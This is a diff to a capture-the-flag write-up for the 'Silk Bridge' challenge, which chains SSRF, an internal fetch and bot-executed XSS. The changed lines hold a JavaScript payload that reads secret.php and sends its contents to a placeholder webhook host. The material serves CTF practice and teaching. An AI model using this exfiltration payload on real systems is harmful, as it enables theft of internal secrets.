@@ -35,6 +35,7 @@ Bypass SSRF protection using client-side scripting + XSS to create an internal r
 
    `Alert: the thing here is that the bot working from seperate container, if you think about it , you need to call the website by its 'domain' or 'web' , the bot won't reach the website if you call it 'localhost' `
 
+
 This "bridge" between SSRF → internal fetch → bot JS execution is why the challenge is called **Silk Bridge**.
 
 ---
@@ -44,4 +45,4 @@ This "bridge" between SSRF → internal fetch → bot JS execution is why the ch
 ```javascript
 api=http://web/console.php?cmd=fetch('http://web/secret.php')
   .then(res => res.text())
-  .then(data => fetch('<webhook>?flag=' + encodeURIComponent(data)))
+  .then(data => fetch(`http://<webhook>?flag=${encodeURIComponent(data)}`))
